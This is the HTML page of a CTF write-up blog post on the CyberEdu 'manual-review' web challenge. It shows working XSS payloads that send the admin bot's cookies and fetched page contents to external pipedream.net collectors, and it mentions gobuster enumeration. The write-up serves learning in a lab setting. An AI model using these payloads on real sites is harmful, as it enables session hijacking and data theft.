<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CyberEdu manual-review Writeup | Irina&#39;s CTF Writeups</title>
<meta name="keywords" content="CyberEdu, web">
<meta name="description" content="Challenge overview
For any coffe machine issue please open a ticket at the IT support department.
Flag format: ctf{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.

Identifying the vulnerabilities
This look familiar?

Alright, so XSS is confirmed, and we have two types of cookies.
First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
I sent a  &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -">
<meta name="author" content="">
<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/">
<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/">
  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
  <meta property="og:title" content="CyberEdu manual-review Writeup">
  <meta property="og:description" content="Challenge overview For any coffe machine issue please open a ticket at the IT support department.
Flag format: ctf{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.
Identifying the vulnerabilities This look familiar?
Alright, so XSS is confirmed, and we have two types of cookies.
First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
I sent a &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-12T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-12T00:00:00+00:00">
    <meta property="article:tag" content="CyberEdu">
    <meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CyberEdu manual-review Writeup">
<meta name="twitter:description" content="Challenge overview
For any coffe machine issue please open a ticket at the IT support department.
Flag format: ctf{sha256}
Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.

Identifying the vulnerabilities
This look familiar?

Alright, so XSS is confirmed, and we have two types of cookies.
First, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.
I sent a  &lt;script&gt; fetch(&#39;https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=&#39; &#43; encodeURIComponent(document.cookie)); &lt;/script&gt; and look at what we got -">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://irinasusca.github.io/writeup-blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CyberEdu manual-review Writeup",
      "item": "https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberEdu manual-review Writeup",
  "name": "CyberEdu manual-review Writeup",
  "description": "Challenge overview For any coffe machine issue please open a ticket at the IT support department.\nFlag format: ctf{sha256}\nGoal: The web application contains a vulnerability which allows an attacker to leak sensitive information.\nIdentifying the vulnerabilities This look familiar?\nAlright, so XSS is confirmed, and we have two types of cookies.\nFirst, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.\nI sent a \u0026lt;script\u0026gt; fetch('https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=' + encodeURIComponent(document.cookie)); \u0026lt;/script\u0026gt; and look at what we got -\n",
  "keywords": [
    "CyberEdu", "web"
  ],
  "articleBody": "Challenge overview For any coffe machine issue please open a ticket at the IT support department.\nFlag format: ctf{sha256}\nGoal: The web application contains a vulnerability which allows an attacker to leak sensitive information.\nIdentifying the vulnerabilities This look familiar?\nAlright, so XSS is confirmed, and we have two types of cookies.\nFirst, the CSRF protection tokens, XSTF-TOKEN, then the manual_review_session, which actually stores the current session/user.\nI sent a and look at what we got -\nThe first request is from my machine, and the second one is from admin. But we need the manual review to hijack the admin session. Let me explain why.\nBecause the manual_review_session is sent to us with the httponly; attribute, document.cookie cannot access it. So we literally just can’t get them with XSS.\nThe website cookies have this format after decoding:\n{ \"iv\": \"...\", \"value\": \"...\", \"mac\": \"...\" } This is exactly how Laravel encrypts cookies. Laravel is a php framework that provies a bunch of stuff, like auth, CSRF protection, session handling and so on. I send some payloads like so:\n\u003cscript\u003e fetch('/route') .then(r =\u003e r.text()) .then(t =\u003e fetch('https://secondlinkwlimitedrequestsbecauseiusedupthefirstone.m.pipedream.net/?data=' + encodeURIComponent(t)) ); \u003c/script\u003e /admin didn’t exist, /.htpasswd didn’t have access, and we have an imposed X-RateLimit-Limit: 60. I ran gobuster twice because I didn’t learn my lesson the first time, and so I kept getting locked out of the challenge. Incredibly annoying. Anyways, after an hour of waiting I’m back and I printed the admin’s /. There’s something interesting here:\nAnd I mean the http://127.0.0.1:1234/login. I was snooping around the headers to check what the user-agent was, and what port it was coming from and…\nI guess that’s it!\n",
  "wordCount" : "282",
  "inLanguage": "en",
  "datePublished": "2026-01-12T00:00:00Z",
  "dateModified": "2026-01-12T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://irinasusca.github.io/writeup-blog/posts/manualreview-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Irina's CTF Writeups",
    "logo": {
      "@type": "ImageObject",
      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CyberEdu manual-review Writeup
    </h1>
    <div class="post-meta"><span title='2026-01-12 00:00:00 +0000 UTC'>January 12, 2026</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
                <li>
                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
<p>For any coffe machine issue please open a ticket at the IT support department.</p>
<p>Flag format: ctf{sha256}</p>
<p>Goal: The web application contains a vulnerability which allows an attacker to leak sensitive information.</p>
<hr>
<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
<p>This look familiar?</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/manualreview-writeup/xss.png#center"></p>
<p>Alright, so XSS is confirmed, and we have two types of cookies.</p>
<p>First, the CSRF protection tokens, <code>XSTF-TOKEN</code>, then the <code>manual_review_session</code>, which actually stores the current session/user.</p>
<p>I sent a  <code>&lt;script&gt; fetch('https://myprivatelinkwithlimitedrequests.m.pipedream.net/?cookie=' + encodeURIComponent(document.cookie)); &lt;/script&gt;</code> and look at what we got -</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/manualreview-writeup/cookie.png#center"></p>
<p>The first request is from my machine, and the second one is from admin. But we need the <em>manual review</em> to hijack the admin session. Let me explain why.</p>
<p>Because the <code>manual_review_session</code> is sent to us with the <code>httponly;</code> attribute, <code>document.cookie</code> <em>cannot</em> access it. So we literally just can&rsquo;t get them with XSS.</p>
<p>The website cookies have this format after decoding:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;iv&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;...&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;value&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;...&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;mac&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;...&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is exactly how <em>Laravel</em> encrypts cookies. Laravel is a php framework that provies a bunch of stuff, like auth, CSRF protection, session handling and so on. I send some payloads like so:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/route&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">.</span><span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> <span style="color:#f92672">=&gt;</span> <span style="color:#a6e22e">r</span><span style="color:#f92672">.</span><span style="color:#a6e22e">text</span>())
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">.</span><span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">t</span> <span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;https://secondlinkwlimitedrequestsbecauseiusedupthefirstone.m.pipedream.net/?data=&#39;</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">encodeURIComponent</span>(<span style="color:#a6e22e">t</span>))
</span></span><span style="display:flex;"><span>  );
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p><code>/admin</code> didn&rsquo;t exist, <code>/.htpasswd</code> didn&rsquo;t have access, and we have an imposed <code>X-RateLimit-Limit: 60</code>. I ran <code>gobuster</code> twice because I didn&rsquo;t learn my lesson the first time, and so I kept getting locked out of the challenge. Incredibly annoying. Anyways, after an hour of waiting I&rsquo;m back and I printed the admin&rsquo;s <code>/</code>. There&rsquo;s something interesting here:</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/manualreview-writeup/interesting.png#center"></p>
<p>And I mean the <code>http://127.0.0.1:1234/login</code>. I was snooping around the headers to check what the user-agent was, and what port it was coming from and&hellip;</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/manualreview-writeup/flag.png#center"></p>
<p>I guess that&rsquo;s it!</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/web/">Web</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
